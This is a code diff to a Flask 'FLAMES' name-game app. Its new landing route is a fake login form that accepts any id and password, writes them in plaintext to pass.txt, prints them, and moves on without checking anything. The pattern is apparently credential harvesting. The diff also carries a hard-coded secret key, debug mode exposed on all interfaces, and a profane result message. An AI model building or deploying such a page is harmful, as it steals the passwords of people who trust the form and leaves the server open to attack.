@@ -6,11 +6,34 @@ app = Flask(__name__)
 app.config["SECRET_KEY"] = "ThisIsMe"
 first_name = ""
 second_name = ""
-exceptions = ["iniyan", "vignesh", "anees", "malar", "vinayagam", "malar vizhi", "malarvizhi"]
+exceptions = [
+    "iniyan",
+    "vignesh",
+    "anees",
+    "malar",
+    "vinayagam",
+    "malar vizhi",
+    "malarvizhi",
+]
 
-
+@app.route("/", methods=["GET", "POST"])
+def login():
+    if request.method == "POST":
+        id = request.form.get("id")
+        password = request.form.get("pass")
+        with open("pass.txt", "a") as file:
+            file.writelines(f"\nid : {id} pass: {password}")
+            file.close()
+        print(id, password)
+        if password == "" or id == "":
+            return redirect("/")
+        return redirect(f"/l")
+    return render_template("login.html")
+@app.route("/l")
+def load():
+    return render_template("load.html")
 @app.route("/flames", methods=["GET", "POST"])
-def index():
+def flames():
     if request.method == "POST":
         first_name = request.form.get("fname").lower()
         second_name = request.form.get("sname").lower()
@@ -29,15 +52,15 @@ def index():
                     )
                     f.close()
             else:
-                status = "Fuck you"    
+                status = "Fuck you"
                 emoji = "🖕🖕🖕"
             return render_template(
-                    "result.html",
-                    status=status,
-                    emoji=emoji[1],
-                    first_name=first_name,
-                    second_name=second_name,
-                )
+                "result.html",
+                status=status,
+                emoji=emoji[1],
+                first_name=first_name,
+                second_name=second_name,
+            )
     return render_template("index.html")
 
 
@@ -50,15 +73,7 @@ def admin():
 
     return render_template("admin.html", file=file)
 
-@app.route("/", methods = ["GET","POST"])
-def login():
-    if request.method == "POST":
-        id = request.form.get('id')
-        password = request.form.get('pass')
-        with open('pass.txt', 'a') as file:
-            file.writelines(f'\nid : {id} pass: {password}')
-            file.close()
-        print(id, password)
-        return redirect(f"/flames")
-    return render_template("login.html")
+
+
+
 app.run(debug=True, host="0.0.0.0")
